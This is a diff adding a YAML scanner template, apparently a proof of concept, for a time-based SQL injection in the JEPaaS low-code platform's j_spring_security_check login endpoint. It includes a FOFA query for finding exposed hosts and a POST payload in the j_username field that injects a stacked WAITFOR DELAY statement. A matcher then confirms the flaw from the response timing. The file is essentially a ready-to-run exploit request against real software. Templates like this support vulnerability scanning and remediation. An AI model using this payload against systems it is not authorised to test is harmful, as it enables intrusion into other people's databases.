@@ -1,0 +1,20 @@
+id: poc-yaml-jepaas-j-spring-security-check-sqli
+info:
+  name: JEPaaS低代码平台 j_spring_security_check SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: jepaas低代码平台
+  fofa: body="/saas/saasYhAction!sendRandom.action"
+variables:
+  t1: random_int(4,9)
+  t2: t1 + 2
+requests:
+- method: POST
+  path: /j_spring_security_check
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: j_username=');DECLARE @x CHAR(9);SET @x=0x303a303a3{{.t1}};WAITFOR DELAY @x--
+  expression: "status_code == 302 && \ncontains(body,\"The URL has moved\") &&\ncontains(body,\"\
+    error=true\") &&\nduration > t1 &&\nduration < t2\n"
+transport: http
